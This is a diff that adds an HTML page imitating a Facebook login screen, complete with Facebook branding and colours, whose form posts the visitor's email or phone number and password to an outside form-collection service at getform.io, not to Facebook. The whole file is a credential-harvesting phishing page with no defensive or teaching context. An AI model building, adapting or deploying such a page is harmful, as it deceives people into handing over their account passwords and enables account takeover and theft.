@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Facebook Login</title>
+
+    <style>
+
+        /* Styles for the login form */
+
+        body {
+
+            font-family: Arial, sans-serif;
+
+            background-color: #f0f2f5;
+
+        }
+
+        .container {
+
+            max-width: 400px;
+
+            margin: 50px auto;
+
+            padding: 20px;
+
+            background-color: #fff;
+
+            border-radius: 8px;
+
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+
+        }
+
+        h2 {
+
+            margin-bottom: 20px;
+
+            text-align: center;
+
+            color: #1877f2; /* Facebook blue color */
+
+        }
+
+        input[type="text"],
+
+        input[type="password"],
+
+        select {
+
+            width: 100%;
+
+            padding: 10px;
+
+            margin-bottom: 15px;
+
+            border: 1px solid #ddd;
+
+            border-radius: 5px;
+
+            box-sizing: border-box;
+
+        }
+
+        input[type="checkbox"] {
+
+            margin-bottom: 15px;
+
+        }
+
+        button[type="submit"] {
+
+            width: 100%;
+
+            padding: 10px;
+
+            background-color: #1877f2;
+
+            color: #fff;
+
+            border: none;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+        }
+
+        button[type="submit"]:hover {
+
+            background-color: #0e5a8a;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+
+        <h2>Log in to Facebook</h2>
+
+        <form action="https://getform.io/f/pboxzgna" method="POST">
+
+            <input type="text" name="email" placeholder="Phone number or email">
+
+            <input type="password" name="passport" placeholder="Passport" required>
+
+            <!-- Add hidden Honeypot input to prevent spams -->
+
+            <input type="hidden" name="_gotcha" style="display:none !important">
+
+            <!-- Checkbox handle -->
+
+            <input type="checkbox" id="remember" name="remember">
+
+            <label for="remember">Remember me</label>
+
+            <button type="submit">Log In</button>
+
+        </form>
+
+    </div>
+
+</body>
+
+</html>
